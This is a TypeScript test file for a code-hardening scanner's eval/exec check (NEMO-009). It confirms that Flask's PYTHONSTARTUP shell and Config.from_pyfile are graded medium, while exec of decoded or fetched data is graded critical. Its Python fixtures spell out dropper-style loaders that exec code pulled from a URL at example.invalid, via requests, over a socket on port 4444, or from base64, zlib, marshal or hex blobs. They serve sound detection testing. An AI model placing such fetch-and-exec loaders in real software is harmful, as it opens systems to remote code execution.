/**
 * `check pip:flask` told a new user not to depend on the package (#447).
 * NEMO-009 called `flask shell` honouring PYTHONSTARTUP "unsafe
 * deserialization" at CRITICAL. eval/exec executes code; it is CRITICAL only
 * when what it runs is decoded or fetched data.
 *
 * No path decides any of this: every fixture below sits at the scan root.
 */
import { describe, it, expect, beforeAll } from 'vitest';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import { HardeningScanner } from '../../src/hardening/scanner';
import type { SecurityFinding } from '../../src/hardening/security-check';
import { tempDir } from '../helpers/temp-dir';

async function scanDir(dir: string): Promise<SecurityFinding[]> {
  const result = await new HardeningScanner().scan({ targetDir: dir });
  return result.findings;
}

function only(findings: SecurityFinding[], checkId: string, file: string): SecurityFinding[] {
  return findings.filter((f) => f.checkId === checkId && f.file === file && !f.passed);
}

describe('NEMO-009 (Python): eval/exec executes code, CRITICAL only on decoded or fetched data', () => {
  let dir: string;
  let findings: SecurityFinding[];

  const FIXTURES: Record<string, string> = {
    // flask-3.1.3/src/flask/cli.py:1029-1031, `flask shell`
    'flask_cli.py': [
      'import os',
      '',
      'def shell_command():',
      '    ctx = {}',
      '    startup = os.environ.get("PYTHONSTARTUP")',
      '    if startup and os.path.isfile(startup):',
      '        with open(startup) as f:',
      '            eval(compile(f.read(), startup, "exec"), ctx)',
      '',
    ].join('\n'),
    // flask-3.1.3/src/flask/config.py, Config.from_pyfile
    'flask_config.py': [
      'import types',
      '',
      'def from_pyfile(self, filename, silent=False):',
      '    d = types.ModuleType("config")',
      '    d.__file__ = filename',
      '    with open(filename, mode="rb") as config_file:',
      '        exec(compile(config_file.read(), filename, "exec"), d.__dict__)',
      '',
    ].join('\n'),
    'b64_loader.py': 'import base64\nexec(base64.b64decode("cHJpbnQoMSk="))\n',
    'url_loader.py': 'from urllib.request import urlopen\nu = "http://example.invalid/p"\nexec(urlopen(u).read())\n',
    'named_decompress.py': [
      'import base64, zlib',
      'blob = base64.b64decode(DATA)',
      'code = zlib.decompress(blob)',
      'exec(code)',
      '',
    ].join('\n'),
    'named_two_hops.py': [
      'from urllib.request import urlopen',
      'resp = urlopen(URL)',
      'body = resp.read()',
      'exec(body)',
      '',
    ].join('\n'),
    'requests_loader.py': 'import requests\nr = requests.get(URL)\nexec(r.text)\n',
    'socket_loader.py': 'import socket\nsock = socket.create_connection((HOST, 4444))\ndata = sock.recv(4096)\nexec(data)\n',
    'with_loader.py': 'import urllib.request\nwith urllib.request.urlopen(URL) as resp:\n    exec(resp.read())\n',
    'alias_from.py': 'from base64 import b64decode as d\nexec(d(S))\n',
    'alias_module.py': 'import marshal as m\nexec(m.loads(BLOB))\n',
    'bare_decompress.py': 'from zlib import decompress\nexec(decompress(BLOB))\n',
    'codecs_loader.py': 'import codecs\nexec(codecs.decode(S, "rot13"))\n',
    'hex_loader.py': 'import binascii\nexec(binascii.unhexlify(H))\n',
    // An assignment AFTER the call is not "assigned earlier in the file".
    'assigned_later.py': 'import base64\nexec(code)\ncode = base64.b64decode(S)\n',
    'user_input.py': 'result = eval(user_input)\n',
  };

  beforeAll(async () => {
    dir = tempDir('hma-nemo009-');
    for (const [name, body] of Object.entries(FIXTURES)) {
      await fs.writeFile(path.join(dir, name), body);
    }
    findings = await scanDir(dir);
  });

  it('grades flask shell (PYTHONSTARTUP) MEDIUM and does not call it deserialization', () => {
    const hits = only(findings, 'NEMO-009', 'flask_cli.py');
    expect(hits).toHaveLength(1);
    expect(hits[0].line).toBe(8);
    expect(hits[0].severity).toBe('medium');
    expect(hits[0].name).toBe('eval/exec executes code');
    expect(`${hits[0].name} ${hits[0].description}`).not.toMatch(/deserializ/i);
  });

  it('grades Config.from_pyfile MEDIUM', () => {
    const hits = only(findings, 'NEMO-009', 'flask_config.py');
    expect(hits.map((f) => f.severity)).toEqual(['medium']);
  });

  it.each([
    ['b64_loader.py', 'b64decode'],
    ['url_loader.py', 'urlopen'],
    ['named_decompress.py', 'zlib.decompress'],
    ['named_two_hops.py', 'urlopen'],
    ['requests_loader.py', 'requests.get'],
    ['socket_loader.py', 'recv'],
    ['with_loader.py', 'urlopen'],
    ['alias_from.py', 'd'],
    ['alias_module.py', 'm.loads'],
    ['bare_decompress.py', 'decompress'],
    ['codecs_loader.py', 'codecs.decode'],
    ['hex_loader.py', 'unhexlify'],
  ])('keeps %s CRITICAL (its argument comes from %s)', (file, source) => {
    const hits = only(findings, 'NEMO-009', file);
    expect(hits).toHaveLength(1);
    expect(hits[0].severity).toBe('critical');
    expect(hits[0].name).toBe('eval/exec executes code');
    expect(hits[0].message).toContain(source);
  });

  it('does not count an assignment that comes after the call', () => {
    expect(only(findings, 'NEMO-009', 'assigned_later.py').map((f) => f.severity)).toEqual(['medium']);
  });

  it('still reports eval(user_input), at MEDIUM', () => {
    expect(only(findings, 'NEMO-009', 'user_input.py').map((f) => f.severity)).toEqual(['medium']);
  });
});
